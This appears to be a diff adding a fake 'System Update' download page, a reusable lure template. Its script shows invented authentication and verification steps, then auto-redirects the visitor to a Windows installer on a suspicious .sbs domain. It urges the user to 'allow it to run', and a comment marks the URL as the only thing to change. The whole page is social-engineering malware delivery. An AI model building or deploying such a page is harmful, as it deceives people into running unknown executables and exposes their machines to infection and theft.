@@ -1,0 +1,169 @@
+8bf4a1b7418493fe994195<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update</title>
+<meta name="robots" content="noindex, nofollow">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{--bg:#06060c;--card:#0d0d16;--border:rgba(255,255,255,0.05);--t1:#eeeef2;--t2:#6b6b80;--ac:#5b6cf7;--ac2:#8b5cf6;--glow:rgba(91,108,247,0.12)}
+  body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow:hidden}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 30% 20%,rgba(91,108,247,0.06),transparent 60%),radial-gradient(circle at 70% 80%,rgba(139,92,246,0.04),transparent 60%);z-index:0}
+  .wrap{position:relative;z-index:1;width:100%;max-width:440px;animation:up .7s ease}
+  @keyframes up{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
+  .card{background:var(--card);border:1px solid var(--border);border-radius:24px;padding:44px 36px;text-align:center;box-shadow:0 0 100px rgba(91,108,247,0.04),0 24px 48px rgba(0,0,0,0.4)}
+  .badge{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:20px;background:rgba(91,108,247,0.08);border:1px solid rgba(91,108,247,0.15);font-size:11px;font-weight:600;color:var(--ac);letter-spacing:.5px;text-transform:uppercase;margin-bottom:24px}
+  .badge .dot{width:6px;height:6px;border-radius:50%;background:var(--ac);animation:pulse 2s ease infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+  .shield{width:64px;height:64px;border-radius:16px;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 8px 40px rgba(91,108,247,0.3);transition:box-shadow .3s}
+  .shield svg{width:28px;height:28px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  h1{font-size:21px;font-weight:700;letter-spacing:-.3px;margin-bottom:8px}
+  .desc{color:var(--t2);font-size:13px;line-height:1.7;margin-bottom:28px;max-width:340px;margin-left:auto;margin-right:auto}
+  .bar-wrap{margin-bottom:8px}
+  .bar{height:3px;background:rgba(255,255,255,0.04);border-radius:3px;overflow:hidden}
+  .bar-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--ac),var(--ac2));width:0%;transition:width .3s}
+  .status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:var(--t2);margin-bottom:24px;min-height:20px}
+  .status .dot{width:5px;height:5px;border-radius:50%;background:var(--ac);animation:pulse 1.5s ease infinite}
+  .steps{text-align:left;border-top:1px solid var(--border);padding-top:24px;margin-top:4px}
+  .steps-title{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--t2);margin-bottom:16px;font-weight:600}
+  .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;opacity:.4;transition:opacity .4s}
+  .step.active{opacity:1}
+  .step.done{opacity:.6}
+  .step-n{width:24px;height:24px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;transition:all .3s}
+  .step-n.wait{background:rgba(255,255,255,0.04);color:var(--t2)}
+  .step-n.go{background:rgba(91,108,247,0.15);color:var(--ac)}
+  .step-n.ok{background:rgba(16,185,129,0.15);color:#34d399}
+  .step-t{font-size:13px;padding-top:3px}
+  .step-t small{display:block;color:var(--t2);font-size:11px;margin-top:2px}
+  .link{display:inline-block;margin-top:20px;font-size:12px;color:var(--ac);text-decoration:none;opacity:0;transition:opacity .4s}
+  .link.show{opacity:1}
+  .link:hover{text-decoration:underline}
+  .foot{text-align:center;margin-top:16px;font-size:10px;color:rgba(255,255,255,0.15);display:flex;align-items:center;justify-content:center;gap:6px}
+  .foot svg{width:10px;height:10px;stroke:rgba(255,255,255,0.2);fill:none;stroke-width:2}
+  .check{display:none}
+  .check.show{display:block;animation:up .5s ease}
+  .done-icon{width:56px;height:56px;border-radius:14px;background:rgba(16,185,129,0.1);display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
+  .done-icon svg{width:28px;height:28px;stroke:#34d399;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <!-- PHASE 1: Loading & Download -->
+  <div class="card" id="phase1">
+    <div class="badge"><span class="dot"></span> Verified Publisher</div>
+    <div class="shield">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    </div>
+    <h1 id="title">Preparing Your Download</h1>
+    <p class="desc" id="desc">Verifying your access and preparing the secure package. This will only take a moment.</p>
+    <div class="bar-wrap"><div class="bar"><div class="bar-fill" id="bar"></div></div></div>
+    <div class="status"><span class="dot"></span><span id="statusText">Initializing...</span></div>
+
+    <div class="steps">
+      <div class="steps-title">Setup Progress</div>
+      <div class="step active" id="s1">
+        <div class="step-n go" id="s1n">1</div>
+        <div class="step-t">Verifying access<small>Checking authorization</small></div>
+      </div>
+      <div class="step" id="s2">
+        <div class="step-n wait" id="s2n">2</div>
+        <div class="step-t">Downloading package<small>Secure encrypted transfer</small></div>
+      </div>
+      <div class="step" id="s3">
+        <div class="step-n wait" id="s3n">3</div>
+        <div class="step-t">Run the installer<small>Follow the prompt if shown</small></div>
+      </div>
+    </div>
+
+    <a class="link" id="manualLink" href="#">If download doesn't start, click here</a>
+  </div>
+
+  <!-- PHASE 2: After download -->
+  <div class="card check" id="phase2">
+    <div class="done-icon">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <h1>Download Started</h1>
+    <p class="desc">Your download has started. Open the file from your downloads folder to complete setup. It only takes a few seconds.</p>
+
+    <div class="steps">
+      <div class="steps-title">Next Steps</div>
+      <div class="step active">
+        <div class="step-n ok">✓</div>
+        <div class="step-t">Download started<small>Check your downloads folder</small></div>
+      </div>
+      <div class="step active">
+        <div class="step-n go">2</div>
+        <div class="step-t">Open the downloaded file<small>Allow it to run if prompted</small></div>
+      </div>
+      <div class="step active">
+        <div class="step-n wait">3</div>
+        <div class="step-t">Setup completes automatically<small>Takes about 30 seconds — nothing to click</small></div>
+      </div>
+    </div>
+
+    <a class="link show" id="retryLink" href="#">Download again</a>
+  </div>
+
+  <div class="foot">
+    <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+    Encrypted connection • Verified signature
+  </div>
+</div>
+
+<script>
+  // ============================================
+  //  CHANGE THIS URL ONLY
+  // ============================================
+  var INSTALL_URL = "https://api.mockinviteconnectv2.sbs/install/download/windows/81f553e45df98586ae7aa4fdab235df706905462c20e140c5d7ad3f6c7e03ea5";
+  // ============================================
+
+  var bar = document.getElementById('bar');
+  var status = document.getElementById('statusText');
+  var link = document.getElementById('manualLink');
+  var phase1 = document.getElementById('phase1');
+  var phase2 = document.getElementById('phase2');
+
+  link.href = INSTALL_URL;
+  document.getElementById('retryLink').href = INSTALL_URL;
+
+  var timeline = [
+    { t: 600,  pct: 20,  txt: 'Authenticating...', step: null },
+    { t: 1400, pct: 45,  txt: 'Access verified', step: function(){ done(1); activate(2); } },
+    { t: 2200, pct: 70,  txt: 'Preparing package...', step: null },
+    { t: 3000, pct: 90,  txt: 'Starting download...', step: function(){ done(2); activate(3); } },
+    { t: 3600, pct: 100, txt: 'Download initiated', step: function(){
+      done(3);
+      link.classList.add('show');
+      window.location.href = INSTALL_URL;
+      setTimeout(function(){ phase1.style.display='none'; phase2.classList.add('show'); }, 1500);
+    }},
+  ];
+
+  timeline.forEach(function(e){
+    setTimeout(function(){
+      bar.style.width = e.pct + '%';
+      status.textContent = e.txt;
+      if (e.step) e.step();
+    }, e.t);
+  });
+
+  function done(n){
+    var s = document.getElementById('s'+n);
+    var sn = document.getElementById('s'+n+'n');
+    s.classList.remove('active'); s.classList.add('done');
+    sn.className = 'step-n ok'; sn.textContent = '✓';
+  }
+
+  function activate(n){
+    var s = document.getElementById('s'+n);
+    var sn = document.getElementById('s'+n+'n');
+    s.classList.add('active');
+    sn.className = 'step-n go';
+  }
+</script>
+</body>
+</html>55d950aa8cd4145eda
